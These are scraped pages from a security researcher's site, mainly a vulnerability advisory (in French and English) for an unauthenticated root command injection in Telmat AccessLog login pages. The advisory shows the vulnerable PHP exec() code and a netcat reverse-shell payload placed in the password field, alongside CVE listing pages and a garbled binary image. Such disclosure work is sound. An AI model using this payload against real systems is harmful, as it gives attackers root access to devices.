=== Content from podalirius.net_bea1a76c_20250119_133121.html ===

[Podalirius](https://podalirius.net/fr/)

* [Articles](https://podalirius.net/fr/articles/)
* [Writeups](https://podalirius.net/fr/writeups/)
* [Publications](https://podalirius.net/fr/publications/)
* [CVEs](https://podalirius.net/fr/cves/)
* |
* [![](https://podalirius.net/fr/public/flag_en.png)](https://podalirius.net/en/cves/2020-16147/)
* |

# CVE-2020-16147 - Telmat - Unauthenticated root RCE

September 20, 2020

2 minutes de lecture

[Linux](https://podalirius.net/fr/categories/linux/)
â¢
[CVEs](https://podalirius.net/fr/categories/cves/)

[cve](https://podalirius.net/fr/tags/cve/)
â¢
[unauthenticated](https://podalirius.net/fr/tags/unauthenticated/)
â¢
[root](https://podalirius.net/fr/tags/root/)
â¢
[rce](https://podalirius.net/fr/tags/rce/)
â¢
[exploit](https://podalirius.net/fr/tags/exploit/)

* **Titre** : Telmat - Unauthenticated root Remote Code Execution
* **Auteur** : [@Podalirius](https://twitter.com/podalirius_)
* **CVSS** : 10 (Critique)
* **CVSS Vector** : `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

## RÃ©sumÃ©

Une injection de code non authentifiÃ©e sur la page de connexion de Telmat AccessLog, GÃ®t@Box et Educ@Box avec la version logicielle `<= 6.0 (TAL_20180415)` permet l’exÃ©cution de code Ã  distance (RCE) en tant que `root`.

## Produits affectÃ©s

| Constructeur | ModÃ¨le | Version logicielle |
| --- | --- | --- |
| TelMat | AccessLog | `<= 6.0 (TAL_20180415)` |
| TelMat | Educ@Box | `<= 6.0 (TAL_20180415)` |
| TelMat | GÃ®t@Box | `<= 6.0 (TAL_20180415)` |

## Exploitation

Cette vulnÃ©rabilitÃ© a Ã©tÃ© testÃ©e sur un Telmat AccessLog 6.0 (`TAL_20180415`):

![](https://podalirius.net/fr/cves/2020-16147/version.png)

Lors d’un pentest, j’ai trouvÃ© la page de connexion de l’AccessLog. J’ai essayÃ© d’effectuer des injections SQL sur les champs de login et de mot de passe pour contourner le mÃ©canisme d’authentification. J’ai remarquÃ© que la page de connexion avait un comportement inattendu lorsque le mot de passe contenait un guillemet simple `'`. La page de connexion a Ã©tÃ© remplacÃ©e par une barre de progression pendant environ 10 Ã  15 minutes pour tous les clients. (Cela pourrait conduire Ã  un dÃ©ni de service).

En utilisant la **RCE authentifiÃ©e** que j’ai trouvÃ© plus tÃ´t, j’ai extrait le contenu de la page de connexion `/authent.php`. AprÃ¨s avoir analysÃ© le fonctionnement du mÃ©canisme d’authentification, j’ai trouvÃ© cette partie intÃ©ressante (lignes 56 Ã  72 dans le fichier `/authent.php`):

```
if(isset($cpasswd)) {
  unset($res);
  if(strstr($cpasswd,"$apr1$")) {
    $dpsd = explode("$",$cpasswd);
    $salt = $dpsd[2];
    $cmd = "/usr/bin/openssl passwd -apr1 -salt '" . $salt . "' '" . $_POST['whois_pas'] . "'";
    exec($cmd,$res,$cr);
    $ccpasswd = trim($res[0]);
  } else {
    $salt = mb_substr($cpasswd,0,2);
    $cmd = "/usr/bin/openssl passwd -crypt -salt '" . $salt . "' '" . $_POST['whois_pas'] . "'";
    exec($cmd,$res,$cr);
    $ccpasswd = trim($res[0]);
  }
  // ...
}

```

Nous pouvons voir que le contenu de la variable `whois_pas` dans la requÃªte POST est directement ajoutÃ© Ã  la ligne de commande, non filtrÃ©. Il nous suffit maintenant de fermer le guillemet simple `'` et d’ajouter un point-virgule `;` et nous pouvons injecter directement des commandes shell. A la fin de notre injection, nous ajoutons un `#` afin de commenter le reste de la ligne de commande.

**Proof of concept reverse shell :**

In order to get a reverse shell I used the following payload :

| Variable | Contenu |
| --- | --- |
| Login (`whois_adm`) | `poc` |
| Password (`whois_pas`) | `'; nc -e /bin/sh 1.2.3.4 4444 #` |

Nous avons maintenant une RCE non authentifiÃ©e, qui nous donne accÃ¨s Ã  un shell en tant que `root`:

![](https://podalirius.net/fr/cves/2020-16147/poc_rce_noauth.png)

## RemÃ©diations

Afin de corriger cette vulnÃ©rabilitÃ©, vous devez mettre Ã  jour votre TelMat avec la derniÃ¨re version.

Â©
2024
Podalirius



=== Content from podalirius.net_86ecadd4_20250119_133120.html ===

[Podalirius](https://podalirius.net/en/)

* [Articles](https://podalirius.net/en/articles/)
* [Writeups](https://podalirius.net/en/writeups/)
* [Publications](https://podalirius.net/en/publications/)
* [CVEs](https://podalirius.net/en/cves/)
* |
* [![](https://podalirius.net/en/public/flag_fr.png)](https://podalirius.net/fr/categories/cves/)
* |

# Category: CVEs

 Compact view
* ![](https://podalirius.net/en/cves/2022-29710/thumbnail.png)
  May 25, 2022
  CVE-2022-29710 - LimeSurvey - XSS with plugin upload in uploadConfirm.php

  LimeSurvey v5.3.9 and below allows attackers to include javascript or HTML code in the config.xml file of a plugin.

  May 25, 2022
  [CVE-2022-29710 - LimeSurvey - XSS with plugin upload in uploadConfirm.php](https://podalirius.net/en/cves/2022-29710/)
* ![](https://podalirius.net/en/cves/2022-30780/thumbnail.png)

  May 16, 2022
  CVE-2022-30780 - Lighttpd - Denial of Service

  Some versions of lighttpd mishandles HTTP request with an URL overflowing the maximum URL length, resulting in a denial of service.

  May 16, 2022
  [CVE-2022-30780 - Lighttpd - Denial of Service](https://podalirius.net/en/cves/2022-30780/)
* ![](https://podalirius.net/en/cves/2022-26159/thumbnail.png)

  February 28, 2022
  CVE-2022-26159 - Ametys CMS - Unauthenticated information disclosure

  The auto-completion plugin in Ametys CMS before 4.5.0 allows a remote unauthenticated attacker to read documents such as plugins/web/service/search/auto-completion/domain/en.xml.

  February 28, 2022
  [CVE-2022-26159 - Ametys CMS - Unauthenticated information disclosure](https://podalirius.net/en/cves/2022-26159/)
* ![](https://podalirius.net/en/cves/2021-43008/thumbnail.png)

  July 17, 2021
  CVE-2021-43008 - Adminer - Arbitrary file read

  Les versions d'Adminer <= 4.6.2 (corrigÃ© dans la version 4.6.3) permettent Ã  un attaquant d'effectuer une lecture arbitraire de fichier sur le serveur en connectant une base de donnÃ©es MySQL distante Ã  l'Adminer.

  July 17, 2021
  [CVE-2021-43008 - Adminer - Arbitrary file read](https://podalirius.net/en/cves/2021-43008/)
* ![](https://podalirius.net/en/cves/2020-16147/thumbnail.jpg)

  September 20, 2020
  CVE-2020-16147 - Telmat - Unauthenticated root RCE

  An unauthenticated code injection on the login page of Telmat AccessLog, GÃ®t@Box and Educ@Box with software version <= 6.0 (TAL\_20180415) allows Remote Code Execution (RCE) as root.

  September 20, 2020
  [CVE-2020-16147 - Telmat - Unauthenticated root RCE](https://podalirius.net/en/cves/2020-16147/)
* ![](https://podalirius.net/en/cves/2020-16148/thumbnail.jpg)

  September 20, 2020
  CVE-2020-16148 - Telmat - Authenticated root RCE

  An authenticated code injection on the Administration avancee (Advanced administration) page of Telmat AccessLog, Git@Box and Educ@Box with software version <= 6.0 (TAL\_20180415) allows Remote Code Execution (RCE) as root.

  September 20, 2020
  [CVE-2020-16148 - Telmat - Authenticated root RCE](https://podalirius.net/en/cves/2020-16148/)

Â©
2024
Podalirius



=== Content from podalirius.net_8d555d21_20250119_133120.html ===

[Podalirius](https://podalirius.net/en/)

* [Articles](https://podalirius.net/en/articles/)
* [Writeups](https://podalirius.net/en/writeups/)
* [Publications](https://podalirius.net/en/publications/)
* [CVEs](https://podalirius.net/en/cves/)
* |
* [![](https://podalirius.net/en/public/flag_fr.png)](https://podalirius.net/fr/cves/)
* |

# Cves

 Compact view
* ![](https://podalirius.net/en/cves/2022-29710/thumbnail.png)
  May 25, 2022
  CVE-2022-29710 - LimeSurvey - XSS with plugin upload in uploadConfirm.php

  LimeSurvey v5.3.9 and below allows attackers to include javascript or HTML code in the config.xml file of a plugin.

  May 25, 2022
  [CVE-2022-29710 - LimeSurvey - XSS with plugin upload in uploadConfirm.php](https://podalirius.net/en/cves/2022-29710/)
* ![](https://podalirius.net/en/cves/2022-30780/thumbnail.png)

  May 16, 2022
  CVE-2022-30780 - Lighttpd - Denial of Service

  Some versions of lighttpd mishandles HTTP request with an URL overflowing the maximum URL length, resulting in a denial of service.

  May 16, 2022
  [CVE-2022-30780 - Lighttpd - Denial of Service](https://podalirius.net/en/cves/2022-30780/)
* ![](https://podalirius.net/en/cves/2022-26159/thumbnail.png)

  February 28, 2022
  CVE-2022-26159 - Ametys CMS - Unauthenticated information disclosure

  The auto-completion plugin in Ametys CMS before 4.5.0 allows a remote unauthenticated attacker to read documents such as plugins/web/service/search/auto-completion/domain/en.xml.

  February 28, 2022
  [CVE-2022-26159 - Ametys CMS - Unauthenticated information disclosure](https://podalirius.net/en/cves/2022-26159/)
* ![](https://podalirius.net/en/cves/2021-43008/thumbnail.png)

  July 17, 2021
  CVE-2021-43008 - Adminer - Arbitrary file read

  Les versions d'Adminer <= 4.6.2 (corrigÃ© dans la version 4.6.3) permettent Ã  un attaquant d'effectuer une lecture arbitraire de fichier sur le serveur en connectant une base de donnÃ©es MySQL distante Ã  l'Adminer.

  July 17, 2021
  [CVE-2021-43008 - Adminer - Arbitrary file read](https://podalirius.net/en/cves/2021-43008/)
* ![](https://podalirius.net/en/cves/2020-16147/thumbnail.jpg)

  September 20, 2020
  CVE-2020-16147 - Telmat - Unauthenticated root RCE

  An unauthenticated code injection on the login page of Telmat AccessLog, GÃ®t@Box and Educ@Box with software version <= 6.0 (TAL\_20180415) allows Remote Code Execution (RCE) as root.

  September 20, 2020
  [CVE-2020-16147 - Telmat - Unauthenticated root RCE](https://podalirius.net/en/cves/2020-16147/)
* ![](https://podalirius.net/en/cves/2020-16148/thumbnail.jpg)

  September 20, 2020
  CVE-2020-16148 - Telmat - Authenticated root RCE

  An authenticated code injection on the Administration avancee (Advanced administration) page of Telmat AccessLog, Git@Box and Educ@Box with software version <= 6.0 (TAL\_20180415) allows Remote Code Execution (RCE) as root.

  September 20, 2020
  [CVE-2020-16148 - Telmat - Authenticated root RCE](https://podalirius.net/en/cves/2020-16148/)

Â©
2024
Podalirius



=== Content from podalirius.net_0d9e9601_20250119_133121.html ===

[Podalirius](https://podalirius.net/en/)

* [Articles](https://podalirius.net/en/articles/)
* [Writeups](https://podalirius.net/en/writeups/)
* [Publications](https://podalirius.net/en/publications/)
* [CVEs](https://podalirius.net/en/cves/)
* |
* [![](https://podalirius.net/en/public/flag_fr.png)](https://podalirius.net/fr/categories/linux/)
* |

# Category: Linux

 Compact view
* ![](https://podalirius.net/en/cves/2022-30780/thumbnail.png)
  May 16, 2022
  CVE-2022-30780 - Lighttpd - Denial of Service

  Some versions of lighttpd mishandles HTTP request with an URL overflowing the maximum URL length, resulting in a denial of service.

  May 16, 2022
  [CVE-2022-30780 - Lighttpd - Denial of Service](https://podalirius.net/en/cves/2022-30780/)
* ![](https://podalirius.net/en/cves/2022-26159/thumbnail.png)

  February 28, 2022
  CVE-2022-26159 - Ametys CMS - Unauthenticated information disclosure

  The auto-completion plugin in Ametys CMS before 4.5.0 allows a remote unauthenticated attacker to read documents such as plugins/web/service/search/auto-completion/domain/en.xml.

  February 28, 2022
  [CVE-2022-26159 - Ametys CMS - Unauthenticated information disclosure](https://podalirius.net/en/cves/2022-26159/)
* ![](https://podalirius.net/en/cves/2021-43008/thumbnail.png)

  July 17, 2021
  CVE-2021-43008 - Adminer - Arbitrary file read

  Les versions d'Adminer <= 4.6.2 (corrigÃ© dans la version 4.6.3) permettent Ã  un attaquant d'effectuer une lecture arbitraire de fichier sur le serveur en connectant une base de donnÃ©es MySQL distante Ã  l'Adminer.

  July 17, 2021
  [CVE-2021-43008 - Adminer - Arbitrary file read](https://podalirius.net/en/cves/2021-43008/)
* ![](https://podalirius.net/en/cves/2020-16147/thumbnail.jpg)

  September 20, 2020
  CVE-2020-16147 - Telmat - Unauthenticated root RCE

  An unauthenticated code injection on the login page of Telmat AccessLog, GÃ®t@Box and Educ@Box with software version <= 6.0 (TAL\_20180415) allows Remote Code Execution (RCE) as root.

  September 20, 2020
  [CVE-2020-16147 - Telmat - Unauthenticated root RCE](https://podalirius.net/en/cves/2020-16147/)
* ![](https://podalirius.net/en/cves/2020-16148/thumbnail.jpg)

  September 20, 2020
  CVE-2020-16148 - Telmat - Authenticated root RCE

  An authenticated code injection on the Administration avancee (Advanced administration) page of Telmat AccessLog, Git@Box and Educ@Box with software version <= 6.0 (TAL\_20180415) allows Remote Code Execution (RCE) as root.

  September 20, 2020
  [CVE-2020-16148 - Telmat - Authenticated root RCE](https://podalirius.net/en/cves/2020-16148/)

Â©
2024
Podalirius



=== Content from podalirius.net_72dc5f89_20250119_133120.html ===
�PNG

   
IHDR   H   H   �ît   \*PLTEGpL $��)9�)9�)9 $� $� $��)9 $��)9 $�����)9����   tRNS  � `Ͽ`������   cIDATH�c`te�a��\* 5���+�����8���[�� )���PMX��l.1�&��QE��F�\*���\*쉪6�����ʈ���^G} A��R�M    IEND�B`�

=== Content from podalirius.net_665d63e4_20250119_133121.html ===

[Podalirius](https://podalirius.net/en/)

* [Articles](https://podalirius.net/en/articles/)
* [Writeups](https://podalirius.net/en/writeups/)
* [Publications](https://podalirius.net/en/publications/)
* [CVEs](https://podalirius.net/en/cves/)
* |
* [![](https://podalirius.net/en/public/flag_fr.png)](https://podalirius.net/fr/publications/)
* |

# Publications

 Compact view
* ![](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/thumbnail.png)
  November 19, 2021
  GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2

  A talk on optimization of SSTIs payloads in jinja2 to achieve remote code execution, presented at GreHack 2021.

  November 19, 2021
  [GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/)
* ![](https://podalirius.net/en/publications/pagedout-2-what-if-infinite-malloc/thumbnail.jpg)

  September 1, 2020
  PagedOut Issue 2 : What if - Infinite Malloc

  What would happen if we tried to allocate an infinite amount of memory ? This is what we will try to discover in this article !

  September 1, 2020
  [PagedOut Issue 2 : What if - Infinite Malloc](https://podalirius.net/en/publications/pagedout-2-what-if-infinite-malloc/)
* ![](https://podalirius.net/en/publications/what-if-infinite-malloc/thumbnail.jpg)

  September 1, 2020
  PagedOut Issue 2 : What if - Infinite Malloc

  What would happen if we tried to allocate an infinite amount of memory ? This is what we will try to discover in this article !

  September 1, 2020
  [PagedOut Issue 2 : What if - Infinite Malloc](https://podalirius.net/en/publications/what-if-infinite-malloc/)

Â©
2024
Podalirius



=== Content from podalirius.net_0d73568a_20250119_114403.html ===

[Podalirius](https://podalirius.net/en/)

* [Articles](https://podalirius.net/en/articles/)
* [Writeups](https://podalirius.net/en/writeups/)
* [Publications](https://podalirius.net/en/publications/)
* [CVEs](https://podalirius.net/en/cves/)
* |
* [![](https://podalirius.net/en/public/flag_fr.png)](https://podalirius.net/fr/cves/2020-16147/)
* |

# CVE-2020-16147 - Telmat - Unauthenticated root RCE

September 20, 2020

2-minute read

[Linux](https://podalirius.net/en/categories/linux/)
â¢
[CVEs](https://podalirius.net/en/categories/cves/)

[cve](https://podalirius.net/en/tags/cve/)
â¢
[unauthenticated](https://podalirius.net/en/tags/unauthenticated/)
â¢
[root](https://podalirius.net/en/tags/root/)
â¢
[rce](https://podalirius.net/en/tags/rce/)
â¢
[exploit](https://podalirius.net/en/tags/exploit/)

* **Title** : Telmat - Unauthenticated root Remote Code Execution
* **Author** : [@Podalirius](https://twitter.com/podalirius_)
* **CVSS** : 10 (Critical)
* **CVSS Vector** : `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

## Summary

An unauthenticated code injection on the login page of Telmat AccessLog, GÃ®t@Box and Educ@Box with software version `<= 6.0 (TAL_20180415)` allows Remote Code Execution (RCE) as `root`.

## Affected products

| Manufacturer | Model | Software version |
| --- | --- | --- |
| TelMat | AccessLog | `<= 6.0 (TAL_20180415)` |
| TelMat | Educ@Box | `<= 6.0 (TAL_20180415)` |
| TelMat | GÃ®t@Box | `<= 6.0 (TAL_20180415)` |

## Exploitation

This vulnerability was tested on a Telmat AccessLog 6.0 (`TAL_20180415`):

![](https://podalirius.net/en/cves/2020-16147/version.png)

During a pentest, I found the login page of the AccessLog. I tried to perform SQL injections on the login and password fields to bypass the authentication mechanism. I noticed that the login page had an unexpected behavior when the password contained a single quote `'`. The login page was replaced by a progress bar for about 10 to 15 minutes for all clients. (This could lead to a denial of service)

Using the **Authenticated RCE** I found earlier, I extracted the contents of the login page `/authent.php`. After analyzing how the authentication mechanism works, I found this interesting part (lines 56 to 72 in file `/authent.php`) :

```
if(isset($cpasswd)) {
  unset($res);
  if(strstr($cpasswd,"$apr1$")) {
    $dpsd = explode("$",$cpasswd);
    $salt = $dpsd[2];
    $cmd = "/usr/bin/openssl passwd -apr1 -salt '" . $salt . "' '" . $_POST['whois_pas'] . "'";
    exec($cmd,$res,$cr);
    $ccpasswd = trim($res[0]);
  } else {
    $salt = mb_substr($cpasswd,0,2);
    $cmd = "/usr/bin/openssl passwd -crypt -salt '" . $salt . "' '" . $_POST['whois_pas'] . "'";
    exec($cmd,$res,$cr);
    $ccpasswd = trim($res[0]);
  }
  // ...
}

```

We can see that the content of the `whois_pas` variable in the POST request is appended directly to the command line, unfiltered. We now only need to close the single quote `'` and add a semicolon `;` and we can inject shell commands directly. At the end of our injection, we add a `#` in order to comment out the rest of the command line.

**Proof of concept reverse shell :**

In order to get a reverse shell I used the following payload :

| Name | Content |
| --- | --- |
| Login (`whois_adm`) | `poc` |
| Password (`whois_pas`) | `'; nc -e /bin/sh 1.2.3.4 4444 #` |

We now have an unauthenticated RCE, furthermore also running as `root` :

![](https://podalirius.net/en/cves/2020-16147/poc_rce_noauth.png)

## Mitigations

In order to patch this vulnerability you need to update your firmware to the latest version.

Â©
2024
Podalirius



=== Content from podalirius.net_021263e7_20250119_114403.html ===

[Podalirius](https://podalirius.net/en/)

* [Articles](https://podalirius.net/en/articles/)
* [Writeups](https://podalirius.net/en/writeups/)
* [Publications](https://podalirius.net/en/publications/)
* [CVEs](https://podalirius.net/en/cves/)
* |
* [![](https://podalirius.net/en/public/flag_fr.png)](https://podalirius.net/fr/cves/2020-16147/)
* |

# CVE-2020-16147 - Telmat - Unauthenticated root RCE

September 20, 2020

2-minute read

[Linux](https://podalirius.net/en/categories/linux/)
â¢
[CVEs](https://podalirius.net/en/categories/cves/)

[cve](https://podalirius.net/en/tags/cve/)
â¢
[unauthenticated](https://podalirius.net/en/tags/unauthenticated/)
â¢
[root](https://podalirius.net/en/tags/root/)
â¢
[rce](https://podalirius.net/en/tags/rce/)
â¢
[exploit](https://podalirius.net/en/tags/exploit/)

* **Title** : Telmat - Unauthenticated root Remote Code Execution
* **Author** : [@Podalirius](https://twitter.com/podalirius_)
* **CVSS** : 10 (Critical)
* **CVSS Vector** : `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

## Summary

An unauthenticated code injection on the login page of Telmat AccessLog, GÃ®t@Box and Educ@Box with software version `<= 6.0 (TAL_20180415)` allows Remote Code Execution (RCE) as `root`.

## Affected products

| Manufacturer | Model | Software version |
| --- | --- | --- |
| TelMat | AccessLog | `<= 6.0 (TAL_20180415)` |
| TelMat | Educ@Box | `<= 6.0 (TAL_20180415)` |
| TelMat | GÃ®t@Box | `<= 6.0 (TAL_20180415)` |

## Exploitation

This vulnerability was tested on a Telmat AccessLog 6.0 (`TAL_20180415`):

![](https://podalirius.net/en/cves/2020-16147/version.png)

During a pentest, I found the login page of the AccessLog. I tried to perform SQL injections on the login and password fields to bypass the authentication mechanism. I noticed that the login page had an unexpected behavior when the password contained a single quote `'`. The login page was replaced by a progress bar for about 10 to 15 minutes for all clients. (This could lead to a denial of service)

Using the **Authenticated RCE** I found earlier, I extracted the contents of the login page `/authent.php`. After analyzing how the authentication mechanism works, I found this interesting part (lines 56 to 72 in file `/authent.php`) :

```
if(isset($cpasswd)) {
  unset($res);
  if(strstr($cpasswd,"$apr1$")) {
    $dpsd = explode("$",$cpasswd);
    $salt = $dpsd[2];
    $cmd = "/usr/bin/openssl passwd -apr1 -salt '" . $salt . "' '" . $_POST['whois_pas'] . "'";
    exec($cmd,$res,$cr);
    $ccpasswd = trim($res[0]);
  } else {
    $salt = mb_substr($cpasswd,0,2);
    $cmd = "/usr/bin/openssl passwd -crypt -salt '" . $salt . "' '" . $_POST['whois_pas'] . "'";
    exec($cmd,$res,$cr);
    $ccpasswd = trim($res[0]);
  }
  // ...
}

```

We can see that the content of the `whois_pas` variable in the POST request is appended directly to the command line, unfiltered. We now only need to close the single quote `'` and add a semicolon `;` and we can inject shell commands directly. At the end of our injection, we add a `#` in order to comment out the rest of the command line.

**Proof of concept reverse shell :**

In order to get a reverse shell I used the following payload :

| Name | Content |
| --- | --- |
| Login (`whois_adm`) | `poc` |
| Password (`whois_pas`) | `'; nc -e /bin/sh 1.2.3.4 4444 #` |

We now have an unauthenticated RCE, furthermore also running as `root` :

![](https://podalirius.net/en/cves/2020-16147/poc_rce_noauth.png)

## Mitigations

In order to patch this vulnerability you need to update your firmware to the latest version.

Â©
2024
Podalirius


